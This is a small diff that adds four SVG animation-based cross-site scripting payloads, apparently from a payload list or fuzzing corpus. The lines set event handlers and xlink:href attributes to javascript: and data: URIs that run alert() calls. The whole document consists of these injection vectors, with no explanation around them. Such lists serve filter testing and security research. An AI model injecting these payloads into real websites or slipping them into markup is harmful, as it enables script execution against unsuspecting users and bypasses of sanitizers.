@@ -1,0 +1,4 @@
+<animate attributeName="onunload" to="alert(89)"/>
+<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
+<animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>
+<animation xlink:href="javascript:alert(88)"/>
